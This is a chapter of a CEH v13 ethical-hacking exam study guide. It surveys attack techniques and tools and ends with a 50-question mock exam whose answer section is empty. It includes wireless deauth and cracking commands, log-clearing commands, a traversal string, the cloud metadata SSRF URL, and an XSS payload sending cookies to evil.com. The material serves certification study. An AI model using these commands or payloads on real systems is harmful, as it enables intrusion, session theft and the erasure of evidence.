# ============================================================
# CHAPTER 7: CEH v13 — Certified Ethical Hacker
# ============================================================

# CEH v13: Certified Ethical Hacker
## Read-to-Pass Complete Guide

Version 1.0 — June 2026 | EC-Council | Exam code: **312-50v13**

---

> **Disclaimer:** Independent study guide. Not affiliated with EC-Council.
> All practice questions are original. Always verify current exam details at eccouncil.org.

<div style="page-break-after: always;"></div>

# Preface

## Who CEH is for and what it proves

CEH v13 is the world's most recognized ethical hacking certification. It matters specifically for:
- **DoD 8140/8570 compliance** — US government and defense contractors must have it for certain roles
- **Enterprise security hiring** — HR departments use it as a filter for security analyst/pen tester roles
- **Offensive security career entry** — validates broad knowledge of attacker TTPs across all domains

CEH is a knowledge exam, not a hands-on lab (that's CEH Practical). You need to know how attacks work conceptually across networks, web apps, wireless, cloud, mobile, IoT, and cryptography. The v13 update added AI-powered attack and defense knowledge — know that section.

## Exam facts

| Item | Detail |
|---|---|
| Provider | EC-Council |
| Exam code | 312-50v13 |
| Questions | 125 multiple-choice |
| Time | 4 hours (240 minutes) |
| Passing score | 60–85% (variable cut score by question pool) |
| Cost | ~$950–$1,199 USD (Pearson VUE or ECC direct) |
| Validity | 3 years (120 ECE credits required) |
| Prerequisite | 2+ years IT security experience OR official EC-Council training |

## Domain breakdown

| Domain | Approximate Weight |
|---|---|
| Advanced Topics: Wireless, Mobile, IoT, Cloud, Cryptography | ~25% |
| Reconnaissance & Scanning | ~20% |
| System Hacking & Malware | ~20% |
| Sniffing, Social Engineering, Session Hijacking, Evasion | ~18% |
| Web & Application Attacks | ~17% |

> **Note:** EC-Council's CEH covers 20 modules but tests across 5 broad domain areas. Questions are spread across all 20 modules.

## Study plan

**8-week plan:**
- Weeks 1–2: Modules 1–5 (Ethics, Footprinting, Scanning, Enumeration, Vulnerability Analysis)
- Weeks 3–4: Modules 6–10 (System Hacking, Malware, Sniffing, Social Engineering, DoS)
- Weeks 5–6: Modules 11–16 (Session Hijacking, Evasion, Web Servers, Web Apps, SQLi, Hacking Wireless)
- Week 7: Modules 17–20 (Mobile, IoT, Cloud, Cryptography + AI security)
- Week 8: Full mock exams, review weak areas

> **Exam Tip:** CEH has 125 questions in 4 hours — that's about 2 minutes per question. The questions test concept-level knowledge (which tool does what, which attack method achieves what goal) not deep technical execution.

<div style="page-break-after: always;"></div>

# Module 1–2: Ethics and Footprinting (Reconnaissance)

## 1.1 Ethical Hacking Concepts

### Types of hackers
- **White hat** — ethical, authorized, works with permission
- **Black hat** — malicious, unauthorized
- **Gray hat** — breaks rules but without malicious intent; often reports vulnerabilities
- **Hacktivist** — ideologically motivated (Anonymous, etc.)
- **State-sponsored / APT** — nation-state, well-resourced, long-term campaigns
- **Script kiddie** — uses tools without understanding them

### Penetration testing types
- **Black box** — no prior knowledge (simulates external attacker)
- **White box** — full knowledge (source code, architecture, credentials)
- **Gray box** — partial knowledge

### Rules of engagement
A penetration test requires written authorization. Without it, the activity is criminal. The **Statement of Work (SOW)** and **Rules of Engagement (RoE)** define scope, limitations, timing, and deliverables.

## 1.2 Footprinting (Passive Reconnaissance)

CEH distinguishes:
- **Passive footprinting** — gathering info without directly interacting with target (OSINT, Shodan, Google, WHOIS, DNS)
- **Active footprinting** — directly probing target (DNS queries, ping, traceroute)

### Key footprinting tools (CEH exam favorites)

| Tool | Purpose |
|---|---|
| Whois | Domain registration info (registrar, owner, name servers) |
| Nslookup / Dig | DNS records (A, MX, NS, TXT, SOA) |
| Maltego | Visual link analysis, relationship mapping |
| theHarvester | Email, hostname, IP enumeration from public sources |
| Shodan | Search engine for internet-connected devices |
| Recon-ng | Web-based recon framework |
| FOCA | Extract metadata from documents |
| Metagoofil | Extract metadata from public files |
| Google Hacking / Dorking | `filetype:`, `site:`, `intitle:`, `inurl:`, `cache:` |

### DNS record types

| Record | Purpose |
|---|---|
| A | IPv4 address |
| AAAA | IPv6 address |
| MX | Mail server |
| NS | Authoritative name servers |
| CNAME | Alias/canonical name |
| TXT | Text (used for SPF, DKIM, DMARC) |
| SOA | Start of Authority (zone info) |
| PTR | Reverse DNS lookup |
| SRV | Service location |

**DNS Zone Transfer** — if misconfigured, allows downloading entire DNS zone. Use `dig axfr @ns1.target.com target.com`. Modern servers block this but it's a CEH exam topic.

<div style="page-break-after: always;"></div>

# Modules 3–5: Scanning, Enumeration, Vulnerability Analysis

## 3.1 Network Scanning

### Scan types (must know for exam)

| Scan type | Description | Firewall bypass |
|---|---|---|
| TCP Connect (-sT) | Full 3-way handshake, logged | No |
| SYN/Stealth (-sS) | Half-open, faster, less logged | Partial |
| NULL scan (-sN) | No flags set | May bypass some firewalls |
| FIN scan (-sF) | FIN flag only | May bypass some firewalls |
| Xmas scan (-sX) | FIN+PSH+URG flags | May bypass some firewalls |
| ACK scan (-sA) | Determine firewall rules (filtered vs unfiltered) | — |
| UDP scan (-sU) | UDP ports (slow) | — |
| IDLE/Zombie scan | Uses a third host, very stealthy | Yes |

**Port states:**
- **Open** — service listening
- **Closed** — no service, but reachable
- **Filtered** — firewall blocking, no response
- **Unfiltered** — reachable but state unknown (ACK scan)

### IDS Evasion during scanning

- **Fragmentation** — split packets into fragments (`nmap -f`)
- **Decoys** — send scans from multiple IPs to confuse logs (`nmap -D RND:10`)
- **Source port manipulation** — use port 80/443 as source
- **Slow scan** — evade time-based detection (`nmap -T1`)
- **Proxy/anonymizer** — route through Tor or proxies

## 4.1 Enumeration

Enumeration is active information gathering about specific services.

### Key enumeration techniques

**NetBIOS enumeration:**
- `nbtstat -a <IP>` — query NetBIOS name table
- `enum4linux -a <IP>` — comprehensive Windows/Samba enumeration

**LDAP enumeration:**
- Anonymous bind → can browse Active Directory tree
- `ldapsearch -x -h <IP> -b "dc=domain,dc=com"`

**SNMP enumeration:**
- Default community strings: `public` (read-only), `private` (read-write)
- Tools: `snmpwalk`, `snmpget`, Metasploit snmp modules
- `snmpwalk -v2c -c public <IP>`

**NFS enumeration:**
- `showmount -e <IP>` — list exported file systems

**DNS enumeration:**
- Zone transfer, brute-force subdomains
- Tools: dnsenum, fierce, dnsrecon

## 5.1 Vulnerability Analysis

**Vulnerability scanning vs Penetration testing:**
- Scanning = automated, identifies known vulnerabilities, non-exploitative
- Pen testing = manual, exploits vulnerabilities to prove impact

**Key vulnerability scanners:**
- **Nessus** — most widely used commercial scanner
- **OpenVAS** — open-source alternative
- **Qualys** — cloud-based
- **Nikto** — web server scanner
- **Retina** — enterprise vulnerability management

**CVE vs CVSS:**
- CVE = identifier for a specific vulnerability (CVE-2021-44228)
- CVSS = score for severity (0–10, Critical/High/Medium/Low)

<div style="page-break-after: always;"></div>

# Modules 6–8: System Hacking, Malware, Sniffing

## 6.1 System Hacking Methodology

CEH defines 4 phases of system hacking:
1. **Gaining Access** — exploiting vulnerabilities, password cracking
2. **Escalating Privileges** — from user to admin/root
3. **Maintaining Access** — backdoors, rootkits, RATs
4. **Clearing Logs** — removing evidence

### Password cracking techniques

| Technique | Description |
|---|---|
| Dictionary attack | Try words from a wordlist |
| Brute force | Try all character combinations |
| Rainbow table | Use precomputed hash table |
| Pass-the-hash | Use captured hash directly (NTLM) |
| Credential stuffing | Use breached username/password pairs |
| Shoulder surfing | Physically observe someone typing |
| Keylogging | Record keystrokes |
| Phishing | Trick user into entering credentials |

**Password cracking tools:** Hashcat, John the Ripper, Medusa, Hydra, Cain & Abel (Windows)

### Privilege Escalation

**Horizontal** — same privilege level, different user (user A → user B, both standard users)
**Vertical** — lower to higher privilege (user → admin, local user → root)

**Common Windows PrivEsc:**
- Unquoted service paths
- Weak registry permissions
- AlwaysInstallElevated
- DLL injection/hijacking
- Token impersonation

**Common Linux PrivEsc:**
- SUID/GUID binaries
- Sudo misconfigurations
- Writable /etc/passwd
- Cron job abuse
- Kernel exploits

### Maintaining Access

**Backdoors:** persistent remote access tools hidden on a compromised system.

**RAT (Remote Access Trojan):** full remote control — file access, keylogging, webcam, shell.

**Rootkit types:**
- **Hypervisor rootkit** — runs below the OS, controls the hypervisor
- **Kernel rootkit** — modifies OS kernel (most powerful, hardest to detect)
- **Boot rootkit (bootkit)** — infects MBR, loads before OS
- **Application rootkit** — replaces legitimate applications
- **Library rootkit** — modifies shared libraries

**Clearing tracks:**
- Clear Event Logs (Windows): `wevtutil cl System`, `wevtutil cl Security`
- Clear Linux logs: shred/overwrite `/var/log/auth.log`, `/var/log/syslog`
- Timestomping: modify file timestamps to hide when access occurred

## 7.1 Malware Types and Analysis

**Trojans delivery methods:** email attachments, drive-by downloads, bundled software, USB drops

**Virus propagation types:** file infectors, boot sector viruses, macro viruses, polymorphic viruses

**Malware analysis:**
- **Static analysis** — examine without running: strings, hashes, PE header analysis. Tools: PEStudio, Binwalk, Ghidra, IDA Pro
- **Dynamic analysis** — run in a sandbox and observe behavior. Tools: Cuckoo Sandbox, Any.run, Remnux
- **Behavioral analysis** — monitor network traffic, registry changes, file system changes during execution

## 8.1 Sniffing

**Passive sniffing** — on a hub network (all traffic broadcasts to all ports). Just listen.

**Active sniffing** — on a switched network, must send traffic to redirect packets:
- **ARP Poisoning/Spoofing** — send fake ARP replies to associate your MAC with victim's IP. MITM.
- **MAC Flooding** — flood switch with fake MACs to fill CAM table, switch fails open (broadcasts like a hub)
- **DHCP Starvation** — flood DHCP pool with fake requests, then set up rogue DHCP server
- **DNS Poisoning** — inject fake DNS responses

**Sniffing tools:** Wireshark, tcpdump, Ettercap, Cain & Abel

**Protocols vulnerable to sniffing (unencrypted):** HTTP, FTP, Telnet, SMTP, POP3, IMAP, SNMP v1/v2

**Sniffing countermeasures:**
- Use encrypted protocols (HTTPS, SFTP, SSH, SMTPS)
- HTTPS/HSTS everywhere
- Use VPN
- Port security on switches (limit MAC addresses per port)
- DAI (Dynamic ARP Inspection) on managed switches
- DHCP snooping on managed switches

<div style="page-break-after: always;"></div>

# Modules 9–12: Social Engineering, DoS, Session Hijacking, Evasion

## 9.1 Social Engineering

**Key social engineering techniques:**
- **Phishing** — mass email impersonating trusted entity
- **Spear phishing** — targeted phishing
- **Whaling** — targeting executives
- **Vishing** — voice/phone phishing
- **Smishing** — SMS phishing
- **Pretexting** — fabricated scenario
- **Baiting** — leaving malware on USB drives
- **Tailgating/Piggybacking** — physical access
- **Quid pro quo** — offer of service in exchange for information

**Psychological principles exploited:**
- Authority — impersonate someone of authority
- Urgency — create time pressure
- Social proof — "everyone else does it"
- Scarcity — "limited availability"
- Reciprocity — do something for them first

## 10.1 Denial of Service (DoS / DDoS)

**DoS categories:**
- **Volumetric** — bandwidth exhaustion (UDP flood, ICMP flood, amplification)
- **Protocol** — SYN flood, Ping of Death, Smurf attack
- **Application layer** — HTTP flood, Slowloris, RUDY

**Amplification attacks:**
- Send small requests to open servers (DNS, NTP, SSDP) with spoofed source IP (victim's)
- Server sends large response to victim → amplified DDoS

**DDoS mitigation:** rate limiting, traffic scrubbing centers, anycast diffusion, CDN, ISP filtering

**Botnets:** large networks of compromised hosts (C2-controlled). Used for DDoS, spam, cryptomining.

## 11.1 Session Hijacking

**Types:**
- **TCP session hijacking** — predict/steal TCP sequence numbers, inject packets
- **Cookie theft** — steal session cookies via XSS, network sniffing
- **Token prediction** — weak/predictable session tokens
- **Man-in-the-Browser (MITB)** — malware intercepts browser sessions

**Countermeasures:** HTTPS everywhere, HttpOnly cookie flag, SameSite cookie attribute, strong token generation, session timeout, bind session to IP/browser fingerprint

## 12.1 Evading IDS/IPS/Firewalls

**IDS evasion techniques:**
- Packet fragmentation
- TTL manipulation
- Protocol-level attacks
- Obfuscation (encode payloads)
- Polymorphic shellcode (changes signature each time)
- Session splicing
- Using covert channels (DNS tunneling, ICMP tunneling)

**Firewall evasion techniques:**
- Use allowed ports (HTTP/80, HTTPS/443)
- Tunneling (SSH tunneling, HTTP CONNECT)
- Fragmentation
- Source IP spoofing
- Use of proxies/Tor

**Honeypot detection:**
- Latency differences
- Traffic analysis
- Known honeypot IP ranges

<div style="page-break-after: always;"></div>

# Modules 13–16: Web, Wireless, Mobile Hacking

## 13.1 Web Application Attacks

### OWASP Top 10 (CEH tests this)

| Rank | Vulnerability | Description |
|---|---|---|
| A01 | Broken Access Control | IDOR, path traversal, privilege escalation |
| A02 | Cryptographic Failures | Weak encryption, PII in cleartext |
| A03 | Injection | SQLi, NoSQLi, OS command injection, LDAPi |
| A04 | Insecure Design | Missing security controls in architecture |
| A05 | Security Misconfiguration | Default credentials, open cloud buckets |
| A06 | Vulnerable Components | Outdated libraries with known CVEs |
| A07 | Identification & Auth Failures | Weak passwords, session issues |
| A08 | Software/Data Integrity Failures | Unsigned updates, CI/CD pipeline attacks |
| A09 | Security Logging Failures | Not detecting/logging breaches |
| A10 | Server-Side Request Forgery (SSRF) | Server makes requests to attacker-controlled URLs |

### Web attack techniques

**XSS types:**
- Reflected — in URL, affects one user
- Stored — in database, affects all users
- DOM-based — in browser JavaScript

**SQL Injection types:**
- In-band (error-based, union-based) — results visible in response
- Blind (boolean-based, time-based) — no visible output, infer from behavior
- Out-of-band — exfiltrate via DNS/HTTP side channel

## 14.1 Hacking Web Servers

**Common web server attacks:**
- Directory traversal — `../../../../etc/passwd`
- Misconfiguration — default files, directory listing enabled
- Buffer overflow — against older web server software
- HTTP response splitting — CRLF injection
- Web cache poisoning

**Web server tools:** Nikto, DirBuster, Gobuster, w3af, Skipfish, Acunetix

## 15.1 Wireless Network Hacking

### Wireless security protocols

| Protocol | Encryption | Auth | Status |
|---|---|---|---|
| WEP | RC4 (broken) | Pre-shared key | Completely broken — never use |
| WPA | TKIP | PSK or Enterprise | Deprecated |
| WPA2 | AES-CCMP | PSK or Enterprise | Widely deployed, some vulnerabilities |
| WPA3 | AES-GCMP | SAE or Enterprise | Current standard |

### Wireless attacks

**WEP cracking:** Collect enough IVs (Initialization Vectors) → statistical attack. Tool: Aircrack-ng.

**WPA/WPA2 PSK cracking:**
1. Capture 4-way handshake during authentication
2. Offline dictionary/brute-force attack on the handshake
3. Tools: Aircrack-ng, Hashcat with WPA2 mode (-m 2500)

**Deauthentication attack:** Send forged deauth frames → disconnect client → client reconnects → capture handshake.

```bash
# Aircrack-ng workflow (exam knowledge, not hands-on):
airmon-ng start wlan0           # enable monitor mode → wlan0mon
airodump-ng wlan0mon            # scan for networks
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon  # capture on specific AP
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon  # deauth attack
aircrack-ng -w rockyou.txt capture*.cap  # crack handshake
```

**Evil twin attack:** Create an access point with the same SSID as the target. Clients connect to the fake AP → MITM.

**WPS attack:**
```bash
# WPS brute force (Reaver)
reaver -i wlan0mon -b AP_MAC -vv
```

## 16.1 Mobile Hacking

**Android security model:**
- Apps run in sandboxed Dalvik/ART VM
- Permissions granted by user
- APKs can be decompiled (apktool, jadx)

**iOS security model:**
- Stricter app sandbox
- Code signing required
- Jailbreaking removes security controls

**Mobile attack vectors:**
- Malicious apps (sideloaded or in store)
- Phishing via SMS or email
- Man-in-the-Middle on Wi-Fi
- Bluetooth attacks (BlueSnarfing, BlueJacking, Bluejacking)
- Malicious QR codes
- SS7 protocol attacks (telecom backbone vulnerabilities)

**MDM (Mobile Device Management):** Corporate control of mobile devices. Can enforce policies, remote wipe, VPN, app whitelisting.

<div style="page-break-after: always;"></div>

# Modules 17–20: IoT, Cloud, Cryptography, AI Security

## 17.1 IoT Hacking

**IoT attack surface:**
- Default credentials (admin/admin, admin/password)
- Unencrypted firmware updates
- No physical security on hardware
- Insecure APIs
- Outdated software (no patch mechanism)
- Unencrypted communications

**IoT protocols to know:**
- MQTT — lightweight pub/sub messaging (port 1883/8883 TLS)
- CoAP — Constrained Application Protocol (UDP/5683)
- ZigBee — short-range mesh networking
- Z-Wave — home automation mesh
- LoRaWAN — long-range, low-power IoT

**IoT attack tools:** Shodan, Censys (find exposed IoT), Binwalk (firmware analysis), RouterSploit

## 18.1 Cloud Security

### Shared Responsibility Model (exam favorite)
- **IaaS** — provider: hardware, hypervisor. Customer: OS, middleware, apps, data.
- **PaaS** — provider: OS, middleware. Customer: apps, data.
- **SaaS** — provider: everything. Customer: data and user management only.

### Cloud attacks

**S3 Bucket Misconfiguration** — publicly accessible S3 buckets exposing sensitive data. Check: `https://s3.amazonaws.com/<bucket-name>` or tools like S3Scanner.

**Server-Side Request Forgery (SSRF)** — trick cloud app into making requests to internal endpoints, including metadata API (`http://169.254.169.254/latest/meta-data/` on AWS). Can expose IAM credentials.

**IDOR in cloud APIs** — changing account IDs in API requests to access other accounts' data.

**Credential exposure** — hardcoded AWS keys in GitHub repos, environment variables, log files.

**Container/Kubernetes attacks:**
- Exposed Kubernetes dashboard (no auth)
- Container escape to host
- Privileged container abuse
- etcd exposed without auth

## 19.1 Cryptography

### Encryption fundamentals

**Symmetric encryption:** One key for encrypt + decrypt. Fast. Problem: key distribution.
- AES (128/192/256-bit) — current standard
- 3DES — legacy, being phased out
- Blowfish, Twofish, RC4

**Asymmetric encryption:** Public/private key pair. Slow. Solves key distribution.
- RSA (2048-bit minimum)
- ECC (Elliptic Curve) — smaller keys, same security
- DSA (Digital Signature Algorithm) — signing only
- Diffie-Hellman — key exchange (not encryption)

**Hashing:** One-way function, fixed output, integrity verification.
- MD5 (128-bit) — BROKEN for security use
- SHA-1 (160-bit) — DEPRECATED
- SHA-256, SHA-512 — current standard
- BLAKE2, SHA-3 — modern alternatives

### PKI (Public Key Infrastructure)

- **CA (Certificate Authority)** — issues and signs digital certificates
- **Certificate** — binds a public key to an identity
- **CRL** — Certificate Revocation List
- **OCSP** — Online Certificate Status Protocol (real-time revocation check)
- **X.509** — certificate standard format
- **PGP** — Pretty Good Privacy (email encryption, web of trust model)

### Cipher modes

| Mode | Full Name | Notes |
|---|---|---|
| ECB | Electronic Code Book | Same input = same output, INSECURE |
| CBC | Cipher Block Chaining | XORs with previous block, needs IV |
| CTR | Counter Mode | Stream cipher mode, parallelizable |
| GCM | Galois/Counter Mode | Authenticated encryption, used in TLS 1.3 |

### Steganography

Hiding data within other data (images, audio, video). Stego ≠ encryption — the existence of data is hidden, not just its content.

**Tools:** Steghide, OpenStego, S-Tools, Foremost (detection)

## 20.1 AI in CEH v13 (New Content)

**AI-powered attacks:**
- **AI-enhanced phishing** — generative AI creates personalized, convincing phishing content at scale
- **Deepfakes** — AI-generated audio/video for vishing/CEO fraud
- **AI fuzzing** — ML-based automated vulnerability discovery
- **Adversarial examples** — inputs designed to fool ML models (e.g., fool AI malware detection)
- **AI-powered OSINT** — automated intelligence gathering and correlation

**AI-powered defenses:**
- **Behavioral analytics** (UEBA) — ML detects anomalous user behavior
- **AI-based SIEM** — anomaly detection in log data
- **AI malware detection** — behavior-based (vs signature-based)
- **Automated threat intelligence** — AI processes threat feeds and prioritizes alerts

> **CEH Exam Tip:** Know the AI attack types (deepfakes, AI phishing, adversarial attacks) and how AI defenses (behavioral analytics, ML-based detection) help counter traditional attack methods. This is new content for v13 and will appear on the exam.

<div style="page-break-after: always;"></div>

# CEH Key Comparison Tables

## Attack Types Quick Reference

| Attack | Target | Mechanism | Defense |
|---|---|---|---|
| SQL Injection | Database | Unsanitized input in SQL query | Parameterized queries, WAF |
| XSS | Browser | Inject scripts into web page | Input validation, CSP, output encoding |
| CSRF | Authenticated session | Trick browser to send forged request | CSRF tokens, SameSite cookie |
| Buffer overflow | Memory | Write past buffer boundary | ASLR, DEP, stack canaries |
| ARP poisoning | Local network | Fake ARP replies | DAI, static ARP entries |
| DNS poisoning | DNS cache | Inject false DNS records | DNSSEC, trusted resolvers |
| Pass-the-hash | Windows auth | Use hash without cracking | Credential Guard, MFA |
| Golden Ticket | Kerberos KDC | Forge TGT after KDC compromise | Protect KDC, enable Protected Users |
| Deauth attack | Wi-Fi client | Forged 802.11 deauth frame | 802.11w Management Frame Protection |
| SSRF | Cloud/internal | Trick server to fetch internal resources | Disable metadata endpoint, whitelist URLs |

## CEH Tool Mapping

| Category | Tool | Purpose |
|---|---|---|
| Reconnaissance | Maltego | Visual intelligence and link analysis |
| Reconnaissance | theHarvester | Email/IP/hostname OSINT |
| Reconnaissance | Shodan | Internet-connected device search |
| Scanning | Nmap | Port scanning, service detection |
| Scanning | Nessus | Vulnerability scanning |
| Enumeration | enum4linux | SMB/Windows enumeration |
| Password cracking | Hashcat | GPU-based hash cracking |
| Password cracking | John the Ripper | CPU-based hash cracking |
| Password cracking | Hydra | Online brute force |
| Exploitation | Metasploit | Exploit framework |
| Sniffing | Wireshark | Packet capture and analysis |
| Sniffing | Ettercap | MITM and ARP poisoning |
| Web hacking | Burp Suite | Web app proxy and scanner |
| Web hacking | SQLmap | Automated SQL injection |
| Web hacking | Nikto | Web server vulnerability scanner |
| Wireless | Aircrack-ng suite | WEP/WPA cracking |
| Wireless | Reaver | WPS brute force |
| Forensics | Autopsy | Digital forensics platform |
| Forensics | Volatility | Memory analysis |
| Steganography | Steghide | Hide/extract data in images |

<div style="page-break-after: always;"></div>

# CEH v13 Mock Exam (50 questions)

**Q1.** Which type of SQL injection sends no results back to the attacker, requiring inference from timing or boolean responses?
- A. Union-based SQLi  B. Error-based SQLi  C. Blind SQLi  D. Out-of-band SQLi

**Q2.** An attacker floods a switch with thousands of fake MAC addresses. The switch's CAM table fills up and it starts broadcasting traffic to all ports. What attack is this?
- A. ARP poisoning  B. VLAN hopping  C. MAC flooding  D. DHCP starvation

**Q3.** Which Nmap flag enables OS detection?
- A. -sV  B. -O  C. -A  D. -sC

**Q4.** WPA3 uses which authentication mechanism, replacing the vulnerable PSK handshake?
- A. TKIP  B. AES-CCMP  C. SAE (Simultaneous Authentication of Equals)  D. EAP-TLS

**Q5.** A rootkit that infects the Master Boot Record and loads before the operating system is called:
- A. Kernel rootkit  B. Application rootkit  C. Hypervisor rootkit  D. Bootkit

**Q6.** Which Metasploit command scans multiple targets and stores results in the database?
- A. search  B. db_nmap  C. run scanner  D. hosts -a

**Q7.** Which type of cipher provides authenticated encryption (confidentiality + integrity) and is used in TLS 1.3?
- A. ECB  B. CBC  C. GCM  D. CTR

**Q8.** An attacker sends a packet with FIN, PSH, and URG flags set. What type of scan is this?
- A. NULL scan  B. FIN scan  C. Xmas scan  D. ACK scan

**Q9.** Which technique involves hiding data within an image file without visibly altering the image?
- A. Cryptography  B. Hashing  C. Steganography  D. Obfuscation

**Q10.** An AWS metadata endpoint at 169.254.169.254 is accessed by a vulnerable web app to retrieve IAM credentials. What attack is this?
- A. CSRF  B. SSRF (Server-Side Request Forgery)  C. LFI  D. XSS

**Q11.** Which passive reconnaissance tool creates visual link charts showing relationships between people, organizations, domains, and IPs?
- A. Shodan  B. Nmap  C. Maltego  D. Metasploit

**Q12.** What does CEH describe as the phase where attackers use rootkits and backdoors to maintain access after compromising a system?
- A. Gaining Access  B. Privilege Escalation  C. Maintaining Access  D. Covering Tracks

**Q13.** A company finds that their Amazon S3 bucket is publicly accessible and contains customer data. What is the MOST likely cause?
- A. SQL injection  B. Bucket misconfiguration (ACL set to public)  C. XSS attack  D. MITM attack

**Q14.** Which hashing algorithm should NOT be used for security purposes because it has known collision vulnerabilities?
- A. SHA-256  B. SHA-3  C. MD5  D. BLAKE2

**Q15.** Which type of malware analysis runs the sample in a controlled environment and monitors its behavior?
- A. Static analysis  B. Dynamic/behavioral analysis  C. Code review  D. Reverse engineering

**Q16.** An organization notices their DNS cache has been poisoned, redirecting users to malicious sites. What DNSSEC feature would have prevented this?
- A. DNSSEC validation (digital signatures on DNS records)  B. DNS over HTTPS  C. SPF records  D. DMARC

**Q17.** Which OWASP Top 10 category covers broken access control, where users can access other users' data by modifying URL parameters?
- A. A03 Injection  B. A07 Identification and Authentication Failures  C. A01 Broken Access Control  D. A05 Security Misconfiguration

**Q18.** A penetration tester uses a deauthentication attack to disconnect clients from their AP. What is the PURPOSE of this attack in WPA2 cracking?
- A. To permanently disable the AP  B. To force clients to reconnect, capturing the WPA2 4-way handshake  C. To perform a DoS attack  D. To access the AP admin interface

**Q19.** Which privilege escalation technique exploits a path vulnerability where Windows searches for service executables in directories the attacker can write to?
- A. AlwaysInstallElevated  B. Token impersonation  C. Unquoted service path  D. Pass-the-hash

**Q20.** An attacker uses AI to generate synthetic audio of a CEO's voice and calls the CFO to authorize a wire transfer. What attack type is this?
- A. Vishing  B. AI-powered deepfake vishing / BEC with deepfake  C. Spear phishing  D. Pretexting

**Q21.** Which tool is used for WPS brute force attacks against wireless access points?
- A. Aircrack-ng  B. Reaver  C. Kismet  D. Wireshark

**Q22.** What is the purpose of timestomping in post-exploitation?
- A. Synchronize server time  B. Modify file timestamps to obscure when files were accessed or created  C. Measure network latency  D. Exploit time-based blind SQL injection

**Q23.** Which IoT protocol uses publish/subscribe messaging and is commonly found on port 1883?
- A. CoAP  B. ZigBee  C. MQTT  D. HTTP

**Q24.** In the Kerberos Golden Ticket attack, what must the attacker compromise to forge valid TGTs?
- A. The web server's SSL certificate  B. Any domain user account  C. The KDC's krbtgt account hash  D. A service account

**Q25.** Which countermeasure specifically prevents MAC flooding attacks on managed switches?
- A. DNSSEC  B. Port security (limiting MAC addresses per port)  C. HSTS  D. OSPF authentication

**Q26.** What is the main difference between a DoS and DDoS attack?
- A. DDoS is more sophisticated technically  B. DDoS uses multiple systems attacking one target simultaneously  C. DoS uses encryption while DDoS doesn't  D. DDoS only targets web servers

**Q27.** Which type of certificate shows the organization name in the browser address bar and requires extensive verification?
- A. DV (Domain Validation)  B. OV (Organization Validation)  C. EV (Extended Validation)  D. Wildcard certificate

**Q28.** An attacker sends ICMP packets larger than 65,535 bytes (the maximum allowed size), causing older systems to crash. What attack is this?
- A. SYN flood  B. Smurf attack  C. Ping of Death  D. Teardrop attack

**Q29.** Which Nmap scan sends packets with no flags set, potentially bypassing some firewalls, and relies on closed ports responding with RST?
- A. SYN scan  B. NULL scan  C. Xmas scan  D. FIN scan

**Q30.** In CEH methodology, what phase comes AFTER gaining access to a system?
- A. Reconnaissance  B. Privilege Escalation  C. Scanning  D. Reporting

**Q31.** Which attack on Bluetooth allows an attacker to copy contact information and messages from a device without authorization?
- A. BlueSnarfing  B. BlueJacking  C. Bluebugging  D. Bluetooth DoS

**Q32.** A web application accepts XML input and an attacker injects external entity references to read /etc/passwd. What vulnerability is this?
- A. SQLi  B. XSS  C. XXE (XML External Entity)  D. SSRF

**Q33.** What type of reconnaissance involves querying a company's job postings, social media, and public documents without directly touching their systems?
- A. Active reconnaissance  B. Passive reconnaissance  C. Social engineering  D. Scanning

**Q34.** Which tool, included in Kali Linux, performs comprehensive enumeration of Windows systems via SMB, including users, shares, and password policies?
- A. Nmap  B. enum4linux  C. Netcat  D. Hydra

**Q35.** A pentester finds a web form vulnerable to XSS and injects `<script>document.location='http://evil.com/?c='+document.cookie</script>`. What does this steal?
- A. Database credentials  B. Session cookies  C. Private keys  D. Password hashes

**Q36.** Which wireless security mode is the MOST vulnerable and should NEVER be used?
- A. WPA2-Enterprise  B. WPA3-Personal  C. WEP  D. WPA2-Personal

**Q37.** A tester runs `nmap --script=smb-vuln-ms17-010` against a target. What vulnerability are they checking for?
- A. Heartbleed  B. EternalBlue (MS17-010, CVE-2017-0144)  C. Shellshock  D. PrintNightmare

**Q38.** Which asymmetric encryption algorithm is based on the mathematical difficulty of factoring large prime numbers?
- A. ECC  B. DSA  C. RSA  D. Diffie-Hellman

**Q39.** An attacker sends DNS queries to open DNS resolvers using a spoofed source IP (the victim's IP). The resolvers send large responses to the victim. What attack type is this?
- A. DNS Poisoning  B. DNS Zone Transfer  C. DNS Amplification  D. DNS Hijacking

**Q40.** Which phase of the penetration testing process involves creating a formal report with findings, evidence, risk ratings, and remediation recommendations?
- A. Post-exploitation  B. Scanning  C. Reporting  D. Clearing tracks

**Q41.** In Windows, which built-in mechanism logs security events such as logon attempts, privilege use, and object access?
- A. Event Viewer > Application Log  B. Windows Defender Log  C. Security Event Log (Event Viewer > Security)  D. System Log

**Q42.** A cloud security engineer discovers that a Lambda function's environment variables contain AWS access keys. What risk does this create?
- A. Lambda functions can't have environment variables  B. The keys could be extracted from the function's configuration, giving unauthorized AWS access  C. Lambda keys are automatically rotated  D. Environment variables are encrypted automatically

**Q43.** Which CEH concept describes an attack that exploits trust relationships between systems to access an unauthorized target?
- A. Pass-the-hash  B. Session hijacking  C. Pivoting  D. Privilege escalation

**Q44.** Which cryptographic attack finds two different inputs that produce the same hash output?
- A. Birthday attack (collision)  B. Rainbow table attack  C. Brute force  D. Dictionary attack

**Q45.** What is the PRIMARY advantage of the IDLE/Zombie scan in Nmap?
- A. It's the fastest scan type  B. It uses the least bandwidth  C. It is completely stealthy (attacker's real IP never appears in target logs)  D. It works on UDP

**Q46.** An attacker modifies the `User-Agent` HTTP header to include PHP code, then uses LFI to include the web server's access log. What attack chain is this?
- A. XSS via log poisoning  B. LFI to RCE via log poisoning  C. SSRF via headers  D. SQL injection via headers

**Q47.** What makes polymorphic malware difficult to detect with traditional signature-based antivirus?
- A. It uses encryption that AV can't break  B. It changes its code/signature with each infection while maintaining the same function  C. It only runs in memory  D. It hides in the BIOS

**Q48.** Which attack type exploits the fact that some symmetric block cipher modes encrypt identical plaintext blocks to identical ciphertext blocks?
- A. Padding oracle attack  B. ECB mode attack (reveals patterns in encrypted data)  C. CBC bit-flipping  D. Stream cipher attack

**Q49.** A penetration tester discovers that the target application uses the HTTP CONNECT method to proxy arbitrary connections. What can this be exploited for?
- A. SQL injection  B. HTTP response splitting  C. Open proxy abuse (using the server to tunnel to other hosts)  D. Directory traversal

**Q50.** Which command in Metasploit, run from a Meterpreter session, searches for local privilege escalation exploits on the compromised system?
- A. `getsystem`  B. `run post/multi/recon/local_exploit_suggester`  C. `hashdump`  D. `migrate`

### Mock Exam Answers

